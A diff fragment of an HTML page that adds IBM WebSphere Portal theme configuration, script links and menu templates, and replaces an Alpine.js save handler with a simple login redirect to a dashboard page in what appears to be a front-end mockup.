+								"&lt;?xml version=&#034;1.0&#034; encoding=&#034;UTF-8&#034;?&gt;&lt;root xmlns=&#034;http://www.ibm.com/xmlns/prod/websphere/portal/v6.1/portal-state&#034;&gt;&lt;state type=&#034;navigational&#034;&gt;&lt;selection selection-node=&#034;Z6_JP841A01OOGJ40QC1U25JV00G6&#034;/&gt;&lt;expansions&gt;&lt;node id=&#034;Z6_JP841A01OO35B0QCM7OASV1005&#034;/&gt;&lt;node id=&#034;Z6_000000000000000000000000A0&#034;/&gt;&lt;/expansions&gt;&lt;/state&gt;&lt;/root&gt;",
+							isUserLoggedIn: false,
+							currentUser: "anonymous portal user",
+							currentUserOID: "",
+							aggregatedStyle: null,
+							isCurrentPageEditable: true,
+							wcmPageMetadata: {
+								contentRoot: null,
+								sharingScope: null,
+							},
+							projectUUID: null,
+						},
+						userName: "",
 					},
-					async handleSaveCompleted(e) {
-						// await this.processForm(e, "onlineDetails", {
-						// 	state: "PIN_ADDED",
-						// });
+					com_ibm_theme_capabilities: {
+						wp_dialog_draggable: "0.0",
+						getting_started_module: "0.0",
+						wp_hiddenpages: "0.0",
+						wp_simple_contextmenu_ext: "0.0",
+						wp_simple_contextmenu_js: "0.0",
+						wp_toolbar_sitepreview_menuactions: "0.0",
+						wp_portlet_css: "0.0",
+						wp_theme_utils: "0.0",
+						wp_toolbar_menuactions: "0.0",
+						wp_toolbar_host_view: "0.0",
+						wp_hiddencontent: "0.0",
+						wp_theme_skin_region: "0.0",
+						wp_portal: "0.0",
+						"photon.dom": "1.0",
+						wp_photon_dom: "0.0",
+						wp_toolbar_sitepreview: "0.0",
+						highContrast: "1.0",
+						wp_status_bar: "0.0",
+						wp_client_tracing: "0.0",
+						modules: "0.1",
+						hasBaseURL: "true",
+						wp_state_page_modes: "0.0",
+						wp_toolbar_common_actionbar: "0.0",
+						wp_client_main: "0.0",
+						wp_toolbar_viewframe_validator: "0.0",
+						wp_high_contrast: "0.0",
+						wp_toolbar_actionbar: "0.0",
+						"simple-contextmenu": "1.1",
+						wp_dialog_css: "0.0",
+						wp_theme_menus: "0.0",
+						wp_client_logging: "0.0",
+						wp_state_page: "0.0",
+						wp_toolbar_common: "0.0",
+						wp_theme_portal_edit_85: "0.0",
+						wp_toolbar_projectmenu: "0.0",
+						wp_dialog_main: "0.0",
+						wp_ic4_wai_resources: "0.0",
+						wp_simple_contextmenu_main: "0.0",
+						snpTheme_dynamicContentSpots_90: "0.0",
+						wp_layout_windowstates: "0.0",
+						wp_toolbar_moremenu: "0.0",
+						wp_custom_page_style: "0.0",
+						wp_toolbar_contextmenu: "0.0",
+						wp_searchbar: "0.0",
+						wp_client_ext: "0.0",
+						wp_simple_contextmenu_css: "0.0",
+						wp_toolbar85: "0.0",
+						wp_modules: "0.0",
+						wp_analytics_aggregator: "0.0",
+						toolbar: "8.5",
+						wp_dialog_util: "0.0",
+						wp_oob_sample_styles: "0.0",
+						wp_toolbar_utils: "0.0",
+						a11y: "1.0",
+						wp_a11y: "0.0",
+						analytics_aggregator: "8.0",
+						wp_theme_portal_85: "0.0",
+						wp_simple_contextmenu_templates: "0.0",
+						wp_toolbar_logo: "0.0",
+					},
+					com_ibm_device_class: [],
+				});
+				ibmCfg.portalConfig.bootstrapState = (
+					ibmCfg.portalConfig.bootstrapState || ""
+				)
+					.replace(/&lt;/gm, "<")
+					.replace(/&gt;/gm, ">")
+					.replace(/&amp;/gm, "&")
+					.replace(/&#039;/gm, "'")
+					.replace(/&#034;/gm, '"');
+				i$.merge({
+					ibmCfg: {
+						portalConfig: {
+							asaConfig: {
+								canViewAsaReports: "false",
+								canViewAsaSitePromotions: "false",
+								canCreateAsaSitePromotions: "false",
+								canDeleteAsaSitePromotions: "false",
+								reportConfig: { scopes: [] },
+							},
+						},
+					},
+				});
+				i$.merge({
+					ibmCfg: { portalConfig: { isShowHiddenPages: false } },
+				});
+			</script>
+			<script
+				type="text/javascript"
+				src="wps/contenthandler/!ut/p/digest!AVpjyN-eMXoHdj8JKNHpMA/mashup/ra:collection?themeID=ZJ_KQL0HB41O86TB0QSC9QMCN0001&amp;locale=ar&amp;locale=en&amp;mime-type=text%252Fjavascript&amp;lm=1598930454000&amp;entry=wp_dialog_main__0.0:config_js&amp;entry=wp_high_contrast__0.0:config_js&amp;entry=wp_state_page_modes__0.0:config_js&amp;entr"
+			></script>
+			<a
+				rel="alternate"
+				id="config_js_deferred"
+				href="wps/contenthandler/!ut/p/digest!AVpjyN-eMXoHdj8JKNHpMA/mashup/ra:collection?themeID=ZJ_KQL0HB41O86TB0QSC9QMCN0001&amp;locale=ar&amp;locale=en&amp;mime-type=text%252Fjavascript&amp;lm=1602785686000&amp;entry=wp_liveobject_framework_core__0.0:config_js&amp;entry=wp_portal_ui_utils__0.0:config_js&amp;entry=wp_contextmenu_js__0.0:"
+				style="display: none"
+			></a
+			><span id="simpleMenuTemplate" class="wpthemeMenuLeft">
+				<div class="wpthemeMenuBorder">
+					<div class="wpthemeMenuNotchBorder"></div>
+					<!-- define the menu item template inside the "ul" element.  only "css-class", "description", and "title" are handled by the theme's sample javascript. -->
+					<ul
+						class="wpthemeMenuDropDown wpthemeTemplateMenu"
+						role="menu"
+					>
+						<li class="${css-class}" role="menuitem" tabindex="-1">
+							<span class="wpthemeMenuText">${title}</span
+							>${badge}
+						</li>
+					</ul>
+				</div>
+				<!-- Template for loading -->
+				<div
+					class="wpthemeMenuLoading wpthemeMenuLoadingText wpthemeTemplateLoading"
+				>
+					${loading}
+				</div>
+				<!-- Template for submenu -->
+				<div class="wpthemeAnchorSubmenu wpthemeTemplateSubmenu">
+					<div class="wpthemeMenuBorder wpthemeMenuSubmenu">
+						<ul
+							id="${submenu-id}"
+							class="wpthemeMenuDropDown"
+							role="menu"
+						>
+							<li role="menuitem" tabindex="-1"></li>
+						</ul>
+					</div>
+				</div> </span
+			><a
+				rel="alternate"
+				id="config_markup_deferred"
+				href="wps/contenthandler/!ut/p/digest!rIZyOjvFenyxUdDRYj-UjA/mashup/ra:collection?themeID=ZJ_KQL0HB41O86TB0QSC9QMCN0001&amp;locale=ar&amp;locale=en&amp;mime-type=text%252Fplain&amp;entry=wp_contextmenu_templates__0.0:config_markup&amp;entry=wp_skin_cam__0.0:config_markup&amp;entry=wp_dnd_main__0.0:config_markup&amp;deferred=true"
+				style="display: none"
+			></a>
+		</div>
+		<script src="snpResources/dist/js/lib.min.js"></script>
+		<div class="hiddendiv common"></div>
+
+		<script>
+			document.addEventListener("alpine:init", () => {
+				Alpine.data("onboardingForm", () => ({
+					saving: false,
+					handleLogin(e) {
+						e.preventDefault();
+						window.location.href = "dashboard.html";
 					},
 				}));
 			});
